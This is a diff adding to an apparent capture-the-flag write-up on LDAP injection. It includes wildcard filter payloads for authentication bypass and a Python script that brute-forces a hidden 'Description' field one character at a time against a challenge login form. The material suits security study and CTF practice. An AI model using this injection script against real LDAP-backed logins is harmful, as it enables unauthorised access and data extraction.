@@ -4164,9 +4164,44 @@ user=*)(uid=*)(uid=*&password=*
 
 ```
 (&(employeeType=active)(uid=*)(uid=*)(uid=*)(userPassword={password}))
-
 ```
 
+- Authentication Bypass-:
+
+![image](https://github.com/user-attachments/assets/ffea8d70-cb58-4fb5-bb37-e93dd4d88838)
+
+- You can exfiltrate data by bruteforcing chars with "field=(char)*".
+
+```
+(Description=a*)
+```
+
+- Script-:
+
+```python3
+#! /usr/bin/env python3
+import requests
+import string
+charset = string.ascii_lowercase + string.digits+"{}_"
+url="https://lightweight.chal.bts.wh.edu.pl"
+flag="BtSCTF{"
+while True:
+	for i in charset:
+		payload = f"*)(uid=*)(Description={flag+i}*)(uid=*"
+		data = {"username":payload,"password":"*"}
+		status = requests.post(url,data=data).text
+		if "Invalid credentials" in status:
+			pass
+		elif "User Description" in status:
+			flag +=i
+			print(f"[+] Found char:{flag}")
+			break
+	if flag.endswith("}"):
+		print(f"[+] Flag is {flag}")
+		break
+```
+
+- Result-:
 
 
 
